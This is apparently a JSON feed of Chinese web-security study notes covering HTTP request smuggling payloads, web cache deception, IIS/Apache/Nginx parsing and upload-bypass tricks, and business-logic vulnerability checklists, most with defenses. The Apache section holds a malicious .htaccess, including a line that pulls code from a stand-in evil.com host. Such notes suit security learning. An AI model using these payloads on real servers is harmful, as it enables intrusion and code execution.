{
    "version": "https://jsonfeed.org/version/1",
    "title": "Khala • All posts by \"常见漏洞攻防\" category",
    "description": "GLHF",
    "home_page_url": "https://mobius-0.github.io",
    "items": [
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/HTTP%20request/",
            "title": "HTTP请求走私",
            "date_published": "2022-11-27T07:47:26.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>HTTP 请求走私是一种干扰网站处理 HTTP 请求序列方式的技术，最早在 2005 年的一篇 <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==\">文章</span> 中被提出。</p>\n<h1 id=\"成因\"><a class=\"anchor\" href=\"#成因\">#</a> 成因</h1>\n<p>请求走私大多发生于前端服务器和后端服务器对客户端传入的数据理解不一致的情况。这是因为 HTTP 规范提供了两种不同的方法来指定请求的结束位置，即  <code>Content-Length</code>  和  <code>Transfer-Encoding</code>  标头。</p>\n<h1 id=\"分类\"><a class=\"anchor\" href=\"#分类\">#</a> 分类</h1>\n<ul>\n<li>CLTE：前端服务器使用  <code>Content-Length</code>  头，后端服务器使用  <code>Transfer-Encoding</code>  头</li>\n<li>TECL：前端服务器使用  <code>Transfer-Encoding</code>  标头，后端服务器使用  <code>Content-Length</code>  标头。</li>\n<li>TETE：前端和后端服务器都支持  <code>Transfer-Encoding</code>  标头，但是可以通过以某种方式来诱导其中一个服务器不处理它。</li>\n</ul>\n<h1 id=\"攻击\"><a class=\"anchor\" href=\"#攻击\">#</a> 攻击</h1>\n<h2 id=\"cl不为0的get请求\"><a class=\"anchor\" href=\"#cl不为0的get请求\">#</a> CL 不为 0 的 GET 请求</h2>\n<p>当前端服务器允许 GET 请求携带请求体，而后端服务器不允许 GET 请求携带请求体，它会直接忽略掉 GET 请求中的  <code>Content-Length</code>  头，不进行处理。例如下面这个例子：</p>\n<pre><code>GET / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 44\\r\\n\n\nGET /secret HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n\\r\\n\n</code></pre>\n<p>前端服务器处理了  <code>Content-Length</code>  ，而后端服务器没有处理  <code>Content-Length</code>  ，基于 pipeline 机制认为这是两个独立的请求，就造成了漏洞的发生。</p>\n<h2 id=\"cl-cl\"><a class=\"anchor\" href=\"#cl-cl\">#</a> CL-CL</h2>\n<p>根据 RFC 7230，当服务器收到的请求中包含两个  <code>Content-Length</code>  ，而且两者的值不同时，需要返回 400 错误，但是有的服务器并没有严格实现这个规范。这种情况下，当前后端各取不同的  <code>Content-Length</code>  值时，就会出现漏洞。例如：</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\nContent-Length: 8\\r\\n\nContent-Length: 7\\r\\n\n\n12345\\r\\n\na\n</code></pre>\n<p>这个例子中 a 就会被带入下一个请求，变为  <code>aGET / HTTP/1.1\\r\\n</code>  。</p>\n<h2 id=\"cl-te\"><a class=\"anchor\" href=\"#cl-te\">#</a> CL-TE</h2>\n<p>CL-TE 指前端服务器处理  <code>Content-Length</code>  这一请求头，而后端服务器遵守 RFC2616 的规定，忽略掉  <code>Content-Length</code>  ，处理  <code>Transfer-Encoding</code>  。例如：</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n...\nConnection: keep-alive\\r\\n\nContent-Length: 6\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\na\n</code></pre>\n<p>这个例子中 a 同样会被带入下一个请求，变为  <code>aGET / HTTP/1.1\\r\\n</code>  。</p>\n<h2 id=\"te-cl\"><a class=\"anchor\" href=\"#te-cl\">#</a> TE-CL</h2>\n<p>TE-CL 指前端服务器处理  <code>Transfer-Encoding</code>  请求头，而后端服务器处理  <code>Content-Length</code>  请求头。例如：</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n...\nContent-Length: 4\\r\\n\nTransfer-Encoding: chunked\\r\\n\n\\r\\n\n12\\r\\n\naPOST / HTTP/1.1\\r\\n\n\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre>\n<h2 id=\"te-te\"><a class=\"anchor\" href=\"#te-te\">#</a> TE-TE</h2>\n<p>TE-TE 指前后端服务器都处理  <code>Transfer-Encoding</code>  请求头，但是在容错性上表现不同，例如有的服务器可能会处理  <code>Transfer-encoding</code>  ，测试例如：</p>\n<pre><code>POST / HTTP/1.1\\r\\n\nHost: example.com\\r\\n\n...\nContent-length: 4\\r\\n\nTransfer-Encoding: chunked\\r\\n\nTransfer-encoding: cow\\r\\n\n\\r\\n\n5c\\r\\n\naPOST / HTTP/1.1\\r\\n\nContent-Type: application/x-www-form-urlencoded\\r\\n\nContent-Length: 15\\r\\n\n\\r\\n\nx=1\\r\\n\n0\\r\\n\n\\r\\n\n</code></pre>\n<h1 id=\"防御\"><a class=\"anchor\" href=\"#防御\">#</a> 防御</h1>\n<ul>\n<li>禁用后端连接重用</li>\n<li>确保连接中的所有服务器具有相同的配置</li>\n<li>拒绝有二义性的请求</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"rfc\"><a class=\"anchor\" href=\"#rfc\">#</a> RFC</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzI2MTY=\">RFC 2616 Hypertext Transfer Protocol -- HTTP/1.1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMzA=\">RFC 7230 Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing -- HTTP/1.1</span></li>\n</ul>\n<h2 id=\"blog-whitepaper\"><a class=\"anchor\" href=\"#blog-whitepaper\">#</a> Blog / Whitepaper</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY2dpc2VjdXJpdHkuY29tL2xpYi9IVFRQLVJlcXVlc3QtU211Z2dsaW5nLnBkZg==\">HTTP Request Smuggling by chaiml</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3JlcXVlc3Qtc211Z2dsaW5n\">HTTP request smuggling by portswigger</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjY1NA==\">从一道题到协议层攻击之 HTTP 请求走私</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2kuYmxhY2toYXQuY29tL1VTQS0yMC9XZWRuZXNkYXkvdXMtMjAtS2xlaW4tSFRUUC1SZXF1ZXN0LVNtdWdnbGluZy1Jbi0yMDIwLU5ldy1WYXJpYW50cy1OZXctRGVmZW5zZXMtQW5kLU5ldy1DaGFsbGVuZ2VzLnBkZg==\">HTTP Request Smuggling in 2020</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9sYWJzLmJpc2hvcGZveC5jb20vdGVjaC1ibG9nL2gyYy1zbXVnZ2xpbmctcmVxdWVzdC1zbXVnZ2xpbmctdmlhLWh0dHAvMi1jbGVhcnRleHQtaDJj\">h2c Smuggling: Request Smuggling Via HTTP/2 Cleartext (h2c)</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "HTTP",
                "服务器"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/Web%20Cache/",
            "title": "Web Cache欺骗攻击",
            "date_published": "2022-11-27T07:42:19.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>网站通常都会通过如 CDN、负载均衡器、或者反向代理来实现 Web 缓存功能。通过缓存频繁访问的文件，降低服务器响应延迟。</p>\n<p>例如，网站  <code>htttp://www.example.com</code>  配置了反向代理。对于那些包含用户个人信息的页面，如  <code>http://www.example.com/home.php</code>  ，由于每个用户返回的内容有所不同，因此这类页面通常是动态生成，并不会在缓存服务器中进行缓存。通常缓存的主要是可公开访问的静态文件，如 css 文件、js 文件、txt 文件、图片等等。此外，很多最佳实践类的文章也建议，对于那些能公开访问的静态文件进行缓存，并且忽略 HTTP 缓存头。</p>\n<p>Web cache 攻击类似于 RPO 相对路径重写攻击，都依赖于浏览器与服务器对 URL 的解析方式。当访问不存在的 URL 时，如  <code>http://www.example.com/home.php/non-existent.css</code>  ，浏览器发送 get 请求，依赖于使用的技术与配置，服务器返回了页面  <code>http://www.example.com/home.php</code>  的内容，同时 URL 地址仍然是  <code>http://www.example.com/home.php/non-existent.css</code> ，http 头的内容也与直接访问  <code>http://www.example.com/home.php</code>  相同，cacheing header、content-type（此处为 text/html）也相同。</p>\n<h1 id=\"漏洞成因\"><a class=\"anchor\" href=\"#漏洞成因\">#</a> 漏洞成因</h1>\n<p>当代理服务器设置为缓存静态文件并忽略这类文件的 caching header 时，访问  <code>http://www.example.com/home.php/no-existent.css</code>  时，会发生什么呢？整个响应流程如下：</p>\n<ol>\n<li>浏览器请求  <code>http://www.example.com/home.php/no-existent.css</code>  ;</li>\n<li>服务器返回  <code>http://www.example.com/home.php</code>  的内容 (通常来说不会缓存该页面);</li>\n<li>响应经过代理服务器；</li>\n<li>代理识别该文件有 css 后缀；</li>\n<li>在缓存目录下，代理服务器创建目录  <code>home.php</code>  ，将返回的内容作为  <code>non-existent.css</code>  保存。</li>\n</ol>\n<h1 id=\"漏洞利用\"><a class=\"anchor\" href=\"#漏洞利用\">#</a> 漏洞利用</h1>\n<p>攻击者欺骗用户访问  <code>http://www.example.com/home.php/logo.png?www.myhack58.com</code>  , 导致含有用户个人信息的页面被缓存，从而能被公开访问到。更严重的情况下，如果返回的内容包含 session 标识、安全问题的答案，或者 csrf token。这样攻击者能接着获得这些信息，因为通常而言大部分网站静态资源都是公开可访问的。</p>\n<h1 id=\"漏洞存在的条件\"><a class=\"anchor\" href=\"#漏洞存在的条件\">#</a> 漏洞存在的条件</h1>\n<p>漏洞要存在，至少需要满足下面两个条件：</p>\n<ol>\n<li>web cache 功能根据扩展进行保存，并忽略 caching header;</li>\n<li>当访问如  <code>http://www.example.com/home.php/non-existent.css</code>  不存在的页面，会返回  <code>home.php</code>  的内容。</li>\n</ol>\n<h1 id=\"漏洞防御\"><a class=\"anchor\" href=\"#漏洞防御\">#</a> 漏洞防御</h1>\n<p>防御措施主要包括 3 点：</p>\n<ol>\n<li>设置缓存机制，仅仅缓存 http caching header 允许的文件，这能从根本上杜绝该问题；</li>\n<li>如果缓存组件提供选项，设置为根据 content-type 进行缓存；</li>\n<li>访问  <code>http://www.example.com/home.php/non-existent.css</code>  这类不存在页面，不返回  <code>home.php</code>  的内容，而返回 404 或者 302。</li>\n</ol>\n<h1 id=\"web-cache欺骗攻击实例\"><a class=\"anchor\" href=\"#web-cache欺骗攻击实例\">#</a> Web Cache 欺骗攻击实例</h1>\n<h2 id=\"paypal\"><a class=\"anchor\" href=\"#paypal\">#</a> Paypal</h2>\n<p>Paypal 在未修复之前，通过该攻击，可以获取的信息包括：用户姓名、账户金额、信用卡的最后 4 位数、交易数据、emaill 地址等信息。 受该攻击的部分页面包括：</p>\n<ul>\n<li><code>https://www.paypal.com/myaccount/home/attack.css</code></li>\n<li><code>https://www.paypal.com/myaccount/settings/notifications/attack.css</code></li>\n<li><code>https://history.paypal.com/cgi-bin/webscr/attack.css?cmd=_history-details</code>  。</li>\n</ul>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvYmxvZy9wcmFjdGljYWwtd2ViLWNhY2hlLXBvaXNvbmluZw==\">practical web cache poisoning</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudXNlbml4Lm9yZy9jb25mZXJlbmNlL3VzZW5peHNlY3VyaXR5MTgvcHJlc2VudGF0aW9uL2hhbw==\">End-Users Get Maneuvered: Empirical Analysis of Redirection Hijacking in Content Delivery Networks</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "漏洞",
                "Cache"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E4%B8%AD%E9%97%B4%E4%BB%B6/",
            "title": "中间件",
            "date_published": "2022-11-27T02:59:09.000Z",
            "content_html": "<h1 id=\"iis\"><a class=\"anchor\" href=\"#iis\">#</a> IIS</h1>\n<h2 id=\"iis-60\"><a class=\"anchor\" href=\"#iis-60\">#</a> IIS 6.0</h2>\n<ul>\n<li>\n<p>后缀解析  <code>/xx.asp;.jpg</code></p>\n<ul>\n<li>服务器默认不解析  <code>;</code>  号及其后面的内容，相当于截断。</li>\n</ul>\n</li>\n<li>\n<p>目录解析  <code>/xx.asp/xx.jpg</code>  (xx.asp 目录下任意解析)</p>\n</li>\n<li>\n<p>默认解析  <code>xx.asa</code>   <code>xx.cer</code>   <code>xx.cdx</code></p>\n</li>\n<li>\n<p>PROPFIND 栈溢出漏洞</p>\n</li>\n<li>\n<p>RCE CVE-2017-7269</p>\n</li>\n</ul>\n<h2 id=\"iis-70-75-nginx-0837\"><a class=\"anchor\" href=\"#iis-70-75-nginx-0837\">#</a> IIS 7.0-7.5 / Nginx &lt;= 0.8.37</h2>\n<p>在 Fast-CGI 开启状态下，在文件路径后加上  <code>/xx.php</code>  ，即  <code>xx.jpg/xx.php</code>  会被解析为 php 文件。</p>\n<h2 id=\"put漏洞\"><a class=\"anchor\" href=\"#put漏洞\">#</a> PUT 漏洞</h2>\n<ul>\n<li>开启 WebDAV</li>\n<li>拥有来宾用户，且来宾用户拥有上传权限</li>\n<li>可任意文件上传</li>\n</ul>\n<h2 id=\"windows特性\"><a class=\"anchor\" href=\"#windows特性\">#</a> Windows 特性</h2>\n<p>Windows 不允许空格和点以及一些特殊字符作为结尾，创建这样的文件会自动重命名，所以可以使用  <code>xx.php[空格]</code>  ，  <code>xx.php.</code> ，  <code>xx.php/</code> ，  <code>xx.php::$DATA</code>  上传脚本文件。</p>\n<h2 id=\"文件名猜解\"><a class=\"anchor\" href=\"#文件名猜解\">#</a> 文件名猜解</h2>\n<p>在支持 NTFS 8.3 文件格式时，可利用短文件名猜解目录文件。其中短文件名特征如下：</p>\n<ul>\n<li>文件名为原文件名前 6 位字符加上  <code>~1</code>  ，其中数字部分是递增的，如果存在前缀相同的文件，则后面的数字进行递增。</li>\n<li>后缀名不超过 3 位，超过部分会被截断</li>\n<li>所有小写字母均转换成大写的字母</li>\n<li>文件名后缀长度大于等于 4 或者总长度大于等于 9 时才会生成短文件名，如果包含空格或者其他部分特殊字符，则无视长度条件</li>\n</ul>\n<p>IIS 8.0 之前的版本支持短文件名猜测的 HTTP 方法主要包括：DEBUG、OPTIONS、GET、POST、HEAD、TRACE 六种，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1BU1AtcGQwZnEwMXJnNmE4NDRkLk5FVA==\">需要安装 ASP.NET</span>。而 IIS 8.0 之后的版本只能通过 OPTIONS 和 TRACE 方法猜测成功，但是没有 ASP.NET 的限制。</p>\n<p>这种方法的局限性在于：</p>\n<ul>\n<li>文件夹名前 6 位字符带点”.”，扫描程序会认为是文件而不是文件夹，最终出现误报</li>\n<li>不支持中文文件名</li>\n</ul>\n<p>这种方法可以通过命令  <code>fsutil behavior set disable8dot3 1</code>  关闭 NTFS 8.3 文件格式的支持来修复。</p>\n<h2 id=\"41516-参考链接\"><a class=\"anchor\" href=\"#41516-参考链接\">#</a> 4.15.1.6. 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjMxOA==\">利用 Windows 特性高效猜测目录</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9zb3JvdXNoLnNlY3Byb2plY3QuY29tL2Jsb2cvMjAxOS8wOC91cGxvYWRpbmctd2ViLWNvbmZpZy1mb3ItZnVuLWFuZC1wcm9maXQtMi8=\">Uploading web.config for Fun and Profit 2</span></li>\n</ul>\n<h1 id=\"apache\"><a class=\"anchor\" href=\"#apache\">#</a> Apache</h1>\n<h2 id=\"后缀解析\"><a class=\"anchor\" href=\"#后缀解析\">#</a> 后缀解析</h2>\n<p><code>test.php.x1.x2.x3</code>  （ x1,x2,x3 为没有在 mime.types 文件中定义的文件类型）。Apache 将从右往左开始判断后缀， 若 x3 为非可识别后缀，则判断 x2，直到找到可识别后缀为止，然后对可识别后缀进行解析</p>\n<h2 id=\"htaccess\"><a class=\"anchor\" href=\"#htaccess\">#</a> .htaccess</h2>\n<p>当 AllowOverride 被启用时，上传启用解析规则的.htaccess</p>\n<pre><code>AddType application/x-httpd-php .jpg\nphp_value auto_append_file .htaccess\n#&lt;?php phpinfo();\nOptions ExecCGI\nAddHandler cgi-script .jpg\nOptions +ExecCGI\nAddHandler fcgid-script .gif\nFcgidWrapper &quot;/bin/bash&quot; .gif\nphp_flag allow_url_include 1\nphp_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==\n#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B\n#php_value auto_append_file https://evil.com/evil-code.txt\n</code></pre>\n<h2 id=\"目录遍历\"><a class=\"anchor\" href=\"#目录遍历\">#</a> 目录遍历</h2>\n<p>配置  <code>Options +Indexes</code>  时 Apache 存在目录遍历漏洞。</p>\n<h2 id=\"cve-2017-15715\"><a class=\"anchor\" href=\"#cve-2017-15715\">#</a> CVE-2017-15715</h2>\n<p><code>%0A</code>  绕过上传黑名单。</p>\n<h2 id=\"lighttpd\"><a class=\"anchor\" href=\"#lighttpd\">#</a> lighttpd</h2>\n<pre><code>xx.jpg/xx.php\n</code></pre>\n<h2 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGVhdmVzb25ncy5jb20vUEVORVRSQVRJT04vYXBhY2hlLWN2ZS0yMDE3LTE1NzE1LXZ1bG5lcmFiaWxpdHkuaHRtbA==\">Apache 上传绕过</span></li>\n</ul>\n<h1 id=\"nginx\"><a class=\"anchor\" href=\"#nginx\">#</a> Nginx</h1>\n<h2 id=\"fast-cgi关闭\"><a class=\"anchor\" href=\"#fast-cgi关闭\">#</a> Fast-CGI 关闭</h2>\n<p>在 Fast-CGI 关闭的情况下， Nginx 仍然存在解析漏洞： 在文件路径 (xx.jpg) 后面加上  <code>%00.php</code>  ， 即  <code>xx.jpg%00.php</code>  会被当做 php 文件来解析</p>\n<h2 id=\"fast-cgi开启\"><a class=\"anchor\" href=\"#fast-cgi开启\">#</a> Fast-CGI 开启</h2>\n<p>在 Fast-CGI 开启状态下，在文件路径后加上  <code>/xx.php</code>  ，则  <code>xx.jpg/xx.php</code>  会被解析为 php 文件</p>\n<h2 id=\"cve-2013-4547\"><a class=\"anchor\" href=\"#cve-2013-4547\">#</a> CVE-2013-4547</h2>\n<pre><code>a.jpg\\x20\\x00.php\n</code></pre>\n<h2 id=\"配置错误\"><a class=\"anchor\" href=\"#配置错误\">#</a> 配置错误</h2>\n<h3 id=\"目录穿越\"><a class=\"anchor\" href=\"#目录穿越\">#</a> 目录穿越</h3>\n<p>如果配置中存在类似  <code>location /foo &#123; alias /bar/; &#125;</code>  的配置时， <code>/foo../</code>  会被解析为  <code>/bar/../</code>  从而导致目录穿越的发生。</p>\n<h3 id=\"目录遍历-2\"><a class=\"anchor\" href=\"#目录遍历-2\">#</a> 目录遍历</h3>\n<p>配置中  <code>autoindex on</code>  开启时，Nginx 中存在目录遍历漏洞。</p>\n<h2 id=\"参考链接-2\"><a class=\"anchor\" href=\"#参考链接-2\">#</a> 参考链接</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy45MXJpLm9yZy85MDY0Lmh0bWw=\">CVE-2013-4547 Nginx 解析漏洞深入利用及分析</span></li>\n</ul>\n",
            "tags": [
                "网络安全",
                "中间件",
                "IIS",
                "Apache",
                "Nginx"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%85%8D%E7%BD%AE%E4%B8%8E%E7%AD%96%E7%95%A5%E5%AE%89%E5%85%A8/",
            "title": "配置与策略安全",
            "date_published": "2022-11-27T02:57:09.000Z",
            "content_html": "<h1 id=\"认证策略\"><a class=\"anchor\" href=\"#认证策略\">#</a> 认证策略</h1>\n<h2 id=\"密码策略\"><a class=\"anchor\" href=\"#密码策略\">#</a> 密码策略</h2>\n<ul>\n<li>未限制密码最低位数</li>\n<li>未限制密码必须包含字符集</li>\n<li>为常用密码</li>\n<li>个人信息相关\n<ul>\n<li>手机号</li>\n<li>生日</li>\n<li>姓名</li>\n<li>用户名</li>\n</ul>\n</li>\n<li>未检测常见弱密码\n<ul>\n<li>已泄露的常用密码</li>\n<li>键盘模式</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"加密实现\"><a class=\"anchor\" href=\"#加密实现\">#</a> 加密实现</h2>\n<ul>\n<li>在客户端存储私钥</li>\n</ul>\n<h1 id=\"权限配置\"><a class=\"anchor\" href=\"#权限配置\">#</a> 权限配置</h1>\n<ul>\n<li>运维人员权限粒度过大</li>\n<li>客服人员权限粒度过大</li>\n</ul>\n<h1 id=\"供应链安全\"><a class=\"anchor\" href=\"#供应链安全\">#</a> 供应链安全</h1>\n<h2 id=\"三方认证\"><a class=\"anchor\" href=\"#三方认证\">#</a> 三方认证</h2>\n<ul>\n<li>利用被攻击的第三方服务账号登录其他平台账号</li>\n</ul>\n<h2 id=\"三方库软件\"><a class=\"anchor\" href=\"#三方库软件\">#</a> 三方库 / 软件</h2>\n<ul>\n<li>公开漏洞后没有及时更新</li>\n</ul>\n",
            "tags": [
                "网络安全",
                "策略配置"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/",
            "url": "https://mobius-0.github.io/security/WebNote/Vulnerability%20Attack%20and%20defense/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BC%8F%E6%B4%9E/",
            "title": "逻辑漏洞/业务漏洞",
            "date_published": "2022-11-27T02:50:09.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<p>逻辑漏洞是指由于程序逻辑不严导致一些逻辑分支处理错误造成的漏洞。</p>\n<p>在实际开发中，因为开发者水平不一没有安全意识，而且业务发展迅速内部测试没有及时到位，所以常常会出现类似的漏洞。</p>\n<h1 id=\"安装逻辑\"><a class=\"anchor\" href=\"#安装逻辑\">#</a> 安装逻辑</h1>\n<ul>\n<li>查看能否绕过判定重新安装</li>\n<li>查看能否利用安装文件获取信息</li>\n<li>看能否利用更新功能获取信息</li>\n</ul>\n<h1 id=\"交易\"><a class=\"anchor\" href=\"#交易\">#</a> 交易</h1>\n<h2 id=\"购买\"><a class=\"anchor\" href=\"#购买\">#</a> 购买</h2>\n<ul>\n<li>修改支付的价格</li>\n<li>修改支付的状态</li>\n<li>修改购买数量为负数</li>\n<li>修改金额为负数</li>\n<li>重放成功的请求</li>\n<li>并发数据库锁处理不当</li>\n</ul>\n<h2 id=\"业务风控\"><a class=\"anchor\" href=\"#业务风控\">#</a> 业务风控</h2>\n<ul>\n<li>刷优惠券</li>\n<li>套现</li>\n</ul>\n<h1 id=\"账户\"><a class=\"anchor\" href=\"#账户\">#</a> 账户</h1>\n<h2 id=\"注册\"><a class=\"anchor\" href=\"#注册\">#</a> 注册</h2>\n<ul>\n<li>覆盖注册</li>\n<li>尝试重复用户名</li>\n<li>注册遍历猜解已有账号</li>\n</ul>\n<h2 id=\"密码\"><a class=\"anchor\" href=\"#密码\">#</a> 密码</h2>\n<ul>\n<li>密码未使用哈希算法保存</li>\n<li>没有验证用户设置密码的强度</li>\n</ul>\n<h2 id=\"邮箱用户名\"><a class=\"anchor\" href=\"#邮箱用户名\">#</a> 邮箱用户名</h2>\n<ul>\n<li>前后空格</li>\n<li>大小写变换</li>\n</ul>\n<h2 id=\"cookie\"><a class=\"anchor\" href=\"#cookie\">#</a> Cookie</h2>\n<ul>\n<li>包含敏感信息</li>\n<li>未验证合法性可伪造</li>\n</ul>\n<h2 id=\"手机号用户名\"><a class=\"anchor\" href=\"#手机号用户名\">#</a> 手机号用户名</h2>\n<ul>\n<li>前后空格</li>\n<li>+86</li>\n</ul>\n<h2 id=\"登录\"><a class=\"anchor\" href=\"#登录\">#</a> 登录</h2>\n<ul>\n<li>\n<p>撞库</p>\n<ul>\n<li>设置异地登录检查等机制</li>\n</ul>\n</li>\n<li>\n<p>账号劫持</p>\n</li>\n<li>\n<p>恶意尝试帐号密码锁死账户</p>\n<ul>\n<li>需要设置锁定机制与解锁机制</li>\n</ul>\n</li>\n<li>\n<p>不安全的传输信道</p>\n</li>\n<li>\n<p>登录凭证存储在不安全的位置</p>\n</li>\n</ul>\n<h2 id=\"找回密码\"><a class=\"anchor\" href=\"#找回密码\">#</a> 找回密码</h2>\n<ul>\n<li>重置任意用户密码</li>\n<li>密码重置后新密码在返回包中</li>\n<li>Token 验证逻辑在前端</li>\n<li>X-Forwarded-Host 处理不正确</li>\n<li>找回密码功能泄露用户敏感信息</li>\n</ul>\n<h1 id=\"修改密码\"><a class=\"anchor\" href=\"#修改密码\">#</a> 修改密码</h1>\n<ul>\n<li>越权修改密码</li>\n<li>修改密码没有旧密码验证</li>\n</ul>\n<h2 id=\"申诉\"><a class=\"anchor\" href=\"#申诉\">#</a> 申诉</h2>\n<ul>\n<li>身份伪造</li>\n<li>逻辑绕过</li>\n</ul>\n<h2 id=\"更新\"><a class=\"anchor\" href=\"#更新\">#</a> 更新</h2>\n<ul>\n<li>ORM 更新操作不当可更新任意字段</li>\n<li>权限限制不当可以越权修改</li>\n</ul>\n<h2 id=\"信息查询\"><a class=\"anchor\" href=\"#信息查询\">#</a> 信息查询</h2>\n<ul>\n<li>权限限制不当可以越权查询</li>\n<li>用户信息 ID 可以猜测导致遍历</li>\n</ul>\n<h1 id=\"2fa\"><a class=\"anchor\" href=\"#2fa\">#</a> 2FA</h1>\n<ul>\n<li>重置密码后自动登录没有 2FA</li>\n<li>OAuth 登录没有启用 2FA</li>\n<li>2FA 可爆破</li>\n<li>2FA 有条件竞争</li>\n<li>修改返回值绕过</li>\n<li>激活链接没有启用 2FA</li>\n<li>可通过 CSRF 禁用 2FA</li>\n</ul>\n<h1 id=\"验证码\"><a class=\"anchor\" href=\"#验证码\">#</a> 验证码</h1>\n<ul>\n<li>验证码可重用</li>\n<li>验证码可预测</li>\n<li>验证码强度不够</li>\n<li>验证码无时间限制或者失效时间长</li>\n<li>验证码无猜测次数限制</li>\n<li>验证码传递特殊的参数或不传递参数绕过</li>\n<li>验证码可从返回包中直接获取</li>\n<li>验证码不刷新或无效</li>\n<li>验证码数量有限</li>\n<li>验证码在数据包中返回</li>\n<li>修改 Cookie 绕过</li>\n<li>修改返回包绕过</li>\n<li>验证码在客户端生成或校验</li>\n<li>验证码可 OCR 或使用机器学习识别</li>\n<li>验证码用于手机短信 / 邮箱轰炸</li>\n</ul>\n<h1 id=\"session\"><a class=\"anchor\" href=\"#session\">#</a> Session</h1>\n<ul>\n<li>Session 机制</li>\n<li>Session 猜测 / 爆破</li>\n<li>Session 伪造</li>\n<li>Session 泄漏</li>\n<li>Session Fixation</li>\n</ul>\n<h1 id=\"越权\"><a class=\"anchor\" href=\"#越权\">#</a> 越权</h1>\n<ul>\n<li>\n<p>未授权访问</p>\n<ul>\n<li>静态文件</li>\n<li>通过特定 url 来防止被访问</li>\n</ul>\n</li>\n<li>\n<p>水平越权</p>\n<ul>\n<li>攻击者可以访问与他拥有相同权限的用户的资源</li>\n<li>权限类型不变，ID 改变</li>\n</ul>\n</li>\n<li>\n<p>垂直越权</p>\n<ul>\n<li>低级别攻击者可以访问高级别用户的资源</li>\n<li>权限 ID 不变，类型改变</li>\n</ul>\n</li>\n<li>\n<p>交叉越权</p>\n<ul>\n<li>权限 ID 改变，类型改变</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"随机数安全\"><a class=\"anchor\" href=\"#随机数安全\">#</a> 随机数安全</h1>\n<ul>\n<li>使用不安全的随机数发生器</li>\n<li>使用时间等易猜解的因素作为随机数种子</li>\n</ul>\n<h1 id=\"其他\"><a class=\"anchor\" href=\"#其他\">#</a> 其他</h1>\n<ul>\n<li>用户 / 订单 / 优惠券等 ID 生成有规律，可枚举</li>\n<li>接口无权限、次数限制</li>\n<li>加密算法实现误用</li>\n<li>执行顺序</li>\n<li>敏感信息泄露</li>\n</ul>\n<h1 